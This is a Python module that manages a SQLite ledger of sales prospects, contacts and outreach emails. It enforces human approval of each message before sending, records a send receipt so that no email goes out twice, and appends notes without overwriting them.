def _require_message_part(value, part: str) -> str:
    """One half of the message Adam approves. Absent or blank is a refusal.

    A blank subject or body would reach `send_outreach.py` as an empty argument
    and put an empty email in front of a prospect over Adam's name.
    """
    if not isinstance(value, str) or not value.strip():
        raise ProspectError(
            "create_outreach needs a non-empty %s, got %r -- Adam approves a "
            "whole message, and send_outreach reads both the subject and the "
            "body from this row rather than from a command line"
            % (part, value))
    return value


def create_outreach(
    prospect_id: int,
    contact_id: int,
    subject: str,
    body: str,
    path: str = DB_PATH,
) -> int:
    """Open a conversation in `draft`. Nothing is sent here.

    `draft -> approved` is Adam's per-action approval gate.

    The subject and the body are BOTH required, and both are stored. Adam
    approves a whole message, so a row that carries only half of one is not
    evidence of what he agreed to. Storing the subject also keeps it out of the
    send command line: `send_outreach.py` reads both from this row.
    """
    subject = _require_message_part(subject, "subject")
    body = _require_message_part(body, "body")
    stamp = _now()
    conn = connect(path)
    try:
        with conn:
            _require_prospect(conn, prospect_id)
            _require_contact(conn, contact_id, prospect_id)
            # Two overlapping runs must not each draft, approve and send to the
            # same person. Only ONE non-terminal conversation may be open at a
            # time. A terminal one is finished, so a later run may open a fresh
            # conversation against the same contact.
            open_states = tuple(sorted(set(OUTREACH_STATES) - _TERMINAL_STATES))
            row = conn.execute(
                "SELECT outreach_id, state FROM outreach"
                " WHERE prospect_id = ? AND contact_id = ?"
                "   AND state IN (%s) ORDER BY outreach_id LIMIT 1"
                % ",".join("?" * len(open_states)),
                (prospect_id, contact_id) + open_states,
            ).fetchone()
            if row is not None:
                raise ProspectError(
                    "outreach %d against contact_id %r is still open in state "
                    "%r -- finish it first (advance it to a terminal state) "
                    "instead of opening a second conversation with the same "
                    "person" % (row[0], contact_id, row[1]))
            cur = conn.execute(
                "INSERT INTO outreach (prospect_id, contact_id, state, outcome, "
                "subject, body, note, created_at, updated_at) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
                (prospect_id, contact_id, "draft", None, subject, body, None,
                 stamp, stamp),
            )
            return cur.lastrowid
    finally:
        conn.close()


def advance_outreach(
    outreach_id: int,
    new_state: str,
    outcome: str | None = None,
    note: str | None = None,
    sent_message_id: str | None = None,
    path: str = DB_PATH,
) -> None:
    """Move one outreach row along TRANSITIONS.

    The transition is checked BEFORE the outcome rule, so an illegal advance
    that happens to target `closed` reports the illegal transition -- the thing
    the caller got wrong -- rather than the outcome it supplied correctly.
    """
    conn = connect(path)
    try:
        with conn:
            row = conn.execute(
                "SELECT state, note FROM outreach WHERE outreach_id = ?",
                (outreach_id,)
            ).fetchone()
            if row is None:
                raise ProspectError(
                    "no outreach with outreach_id %r -- open one with "
                    "create_outreach() before advancing it" % (outreach_id,))
            current, stored_note = row[0], row[1]
            legal = TRANSITIONS[current]
            if new_state not in legal:
                if legal:
                    raise IllegalTransition(
                        "outreach %d is %r; %r is not a legal next state -- "
                        "advance to one of %s instead"
                        % (outreach_id, current, new_state, "/".join(legal)))
                raise IllegalTransition(
                    "outreach %d is %r, a terminal state with no legal next "
                    "state -- open a new outreach with create_outreach() "
                    "instead of reopening this one"
                    % (outreach_id, current))

            if new_state == "closed":
                if outcome is None:
                    raise ProspectError(
                        "closing outreach %d needs an outcome -- pass one of %s "
                        "so a closed conversation records what actually "
                        "happened" % (outreach_id, "/".join(OUTCOMES)))
                if outcome not in OUTCOMES:
                    raise ProspectError(
                        "%r is not an outreach outcome -- pass one of %s"
                        % (outcome, "/".join(OUTCOMES)))
            elif outcome is not None:
                raise ProspectError(
                    "outreach %d cannot carry an outcome while advancing to "
                    "%r -- an outcome (%s) belongs only to the `closed` state; "
                    "drop it or close the conversation"
                    % (outreach_id, new_state, "/".join(OUTCOMES)))

            # `sent` is the ONE state that leaves a trace outside this database,
            # so it must carry the receipt for that trace. Without it an approved
            # row whose send completed and one whose send never ran are
            # identical, and `approved -> sent` stays legal, so a recovery pass
            # after an interrupted run can send the same email twice.
            if new_state == "sent":
                if not isinstance(sent_message_id, str) or not sent_message_id.strip():
                    raise ProspectError(
                        "advancing outreach %d to `sent` needs sent_message_id "
                        "-- pass the id the send returned, so an interrupted run "
                        "can tell a delivered message from an approved one and "
                        "never sends it twice" % (outreach_id,))
            elif sent_message_id is not None:
                raise ProspectError(
                    "outreach %d cannot carry a sent_message_id while advancing "
                    "to %r -- a receipt belongs only to the `sent` state"
                    % (outreach_id, new_state))

            # The note is APPENDED, never replaced. draft->approved carries
            # Adam's per-action approval, and every later advance has to leave
            # that record standing. Writing `note` straight through would NULL
            # the stored note on any advance that omits one.
            if note is None:
                merged_note = stored_note
            elif stored_note is None:
                merged_note = note
            else:
                merged_note = stored_note + "\n" + note

            conn.execute(
                "UPDATE outreach SET state = ?, outcome = ?, note = ?, "
                "sent_message_id = ?, updated_at = ? WHERE outreach_id = ?",
                (new_state, outcome, merged_note, sent_message_id, _now(),
                 outreach_id),
            )
    finally:
        conn.close()


def record_run(
    run_key: str,
    hypothesis_type: str,
    searches: list[str],
    result_count: int,
    notes: str | None = None,
    path: str = DB_PATH,
) -> int:
    """Log one hypothesis exploration, INCLUDING one that found nothing.

    A zero-result run is the point: it is what stops the next run repeating the
    same dead end.
    """
    # `run_key` is the attribution. The column is NOT NULL and
    # idx_prospect_runs_key indexes it, so an empty, whitespace or non-string
    # key produces a record nothing can trace back to a run -- and None reached
    # the driver as a bare IntegrityError naming a constraint instead of the
    # thing the caller has to fix.
    run_key_text = _require_text_value(
        run_key, "run_key", "prospect_run", _RUN_KEY_REMEDY)

    _require_registered_type(hypothesis_type)
    key = hypothesis_types.type_key(hypothesis_type)

    if not isinstance(searches, list) or not searches:
        raise ProspectError(
            "searches must be a non-empty list of the queries actually run, "
            "got %r -- an exploration nobody can reproduce is not a record"
            % (searches,))
    for item in searches:
        if not isinstance(item, str) or not item.strip():
            raise ProspectError(
                "searches must hold query strings, got %r in %r -- record the "
                "text of each search" % (item, searches))

    if isinstance(result_count, bool) or not isinstance(result_count, int):
        raise ProspectError(
            "result_count must be an int, got %r -- count the prospects this "
            "exploration produced" % (result_count,))
    if result_count < 0:
        raise ProspectError(
            "result_count %r is negative -- zero is the floor, and zero-result "
            "explorations are recorded on purpose" % (result_count,))

    conn = connect(path)
    try:
        with conn:
            cur = conn.execute(
                "INSERT INTO prospect_runs (run_key, hypothesis_type, searches, "
                "result_count, notes, recorded_at) VALUES (?, ?, ?, ?, ?, ?)",
                (run_key_text, key, json.dumps(searches), result_count, notes,
                 _now()),
            )
            return cur.lastrowid
    finally:
        conn.close()


def expire_events(path: str = DB_PATH) -> int:
    """Kill active prospects whose event date has passed. Returns the count.

    ISO date strings compare lexicographically, so this is one UPDATE. A
    prospect already `rejected` or `dead` is left alone -- its status records a
    decision, and expiry must not overwrite one.
    """
    conn = connect(path)
    try:
        with conn:
            cur = conn.execute(
                "UPDATE prospects SET status = 'dead', updated_at = ? "
                " WHERE status = 'active'"
                "   AND event_date IS NOT NULL"
                "   AND event_date < ?",
                (_now(), _today()),
            )
            return cur.rowcount
    finally:
        conn.close()


# --- reads -----------------------------------------------------------------

# Every read below runs through these two, so no caller outside this module
# writes SQL against the prospect tables. That matters because this module owns
# _SCHEMA: the column names a query uses and the column names the DDL creates
# have to be read from the same file, or a command module invents columns the
# database never had.
def _rows(sql: str, params: tuple = (), path: str = DB_PATH) -> list[dict]:
    conn = connect(path)
    try:
        return [dict(r) for r in conn.execute(sql, params)]
    finally:
        conn.close()


def _one(sql: str, params: tuple, path: str = DB_PATH) -> dict | None:
    rows = _rows(sql, params, path)
    return rows[0] if rows else None


# The display read. `contact_count` and `latest_outreach_state` are correlated
# subqueries rather than joins, so one prospect stays one row.
_LIST_SQL = """
SELECT p.*,
       (SELECT count(*) FROM contacts c WHERE c.prospect_id = p.prospect_id)
           AS contact_count,
       (SELECT o.state FROM outreach o WHERE o.prospect_id = p.prospect_id
         ORDER BY o.outreach_id DESC LIMIT 1) AS latest_outreach_state
  FROM prospects p
"""


def list_prospects(status: str | None = None, path: str = DB_PATH) -> list[dict]:
    """Prospects newest first, optionally filtered by status."""
    conn = ledger_db.connect_readonly(path)
    try:
        if status is None:
            rows = conn.execute(_LIST_SQL + " ORDER BY p.created_at DESC")
        else:
            if status not in PROSPECT_STATUSES:
                raise ProspectError(
                    "%r is not a prospect status -- filter on one of %s"
                    % (status, "/".join(PROSPECT_STATUSES)))
            rows = conn.execute(
                _LIST_SQL + " WHERE p.status = ? ORDER BY p.created_at DESC",
                (status,),
            )
        return [dict(r) for r in rows]
    finally:
        conn.close()


def get_prospect(prospect_id: int, path: str = DB_PATH) -> dict | None:
    """One prospect with its contacts and its outreach history, or None."""
    conn = connect(path)
    try:
        row = conn.execute(
            "SELECT * FROM prospects WHERE prospect_id = ?", (prospect_id,)
        ).fetchone()
        if row is None:
            return None
        out = dict(row)
        out["contacts"] = [
            dict(r) for r in conn.execute(
                "SELECT * FROM contacts WHERE prospect_id = ? ORDER BY contact_id",
                (prospect_id,),
            )
        ]
        out["outreach"] = [
            dict(r) for r in conn.execute(
                "SELECT * FROM outreach WHERE prospect_id = ? ORDER BY outreach_id",
                (prospect_id,),
            )
        ]
        return out
    finally:
        conn.close()


def list_contacts(path: str = DB_PATH) -> list[dict]:
    """Every contact, grouped under its prospect."""
    return _rows("SELECT * FROM contacts ORDER BY prospect_id, %s"
                 % PRIMARY_KEYS["contacts"], (), path)


def list_outreach(path: str = DB_PATH) -> list[dict]:
    """Every outreach row, oldest first, so the conversation reads in order."""
    return _rows("SELECT * FROM outreach ORDER BY %s"
                 % PRIMARY_KEYS["outreach"], (), path)


def list_runs(path: str = DB_PATH) -> list[dict]:
    """Every prospecting run, newest first."""
    return _rows("SELECT * FROM prospect_runs ORDER BY %s DESC"
                 % PRIMARY_KEYS["prospect_runs"], (), path)


def run_row(run_id: int, path: str = DB_PATH) -> dict | None:
    """One prospecting run, or None."""
    return _one("SELECT * FROM prospect_runs WHERE %s = ?"
                % PRIMARY_KEYS["prospect_runs"], (run_id,), path)


def outreach_row(outreach_id: int, path: str = DB_PATH) -> dict | None:
    """One outreach row, or None. `send_outreach.py` reads the recipient's
    message from here rather than from its caller."""
    return _one("SELECT * FROM outreach WHERE %s = ?"
                % PRIMARY_KEYS["outreach"], (outreach_id,), path)


def contact_row(contact_id: int, path: str = DB_PATH) -> dict | None:
    """One contact row, or None. This is where a send reads the address, so no
    caller has to carry it."""
    return _one("SELECT * FROM contacts WHERE %s = ?"
                % PRIMARY_KEYS["contacts"], (contact_id,), path)


def summary(path: str = DB_PATH) -> dict[str, Any]:
    """Counts by prospect status and outreach state, plus the run count."""
    conn = connect(path)
    try:
        return {
            "prospects": {
                r["status"]: r["n"] for r in conn.execute(
                    "SELECT status, count(*) AS n FROM prospects "
                    "GROUP BY status ORDER BY status")
            },
            "outreach": {
                r["state"]: r["n"] for r in conn.execute(
                    "SELECT state, count(*) AS n FROM outreach "
                    "GROUP BY state ORDER BY state")
            },
            "prospect_runs": conn.execute(
                "SELECT count(*) FROM prospect_runs").fetchone()[0],
        }
    finally:
        conn.close()


def main() -> int:
    import argparse

    ap = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("prospect_id", nargs="?",
                    help="report one prospect instead of the ledger summary")
    a = ap.parse_args()
    if not a.prospect_id:
        print(json.dumps(summary(), indent=1))
        return 0
    try:
        prospect_id = int(a.prospect_id)
    except ValueError:
        sys.exit("prospects_db: %r is not a prospect_id" % a.prospect_id)
    row = get_prospect(prospect_id)
    if row is None:
        sys.exit("prospects_db: no prospect %r" % a.prospect_id)
    print(json.dumps(row, indent=1, default=str))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
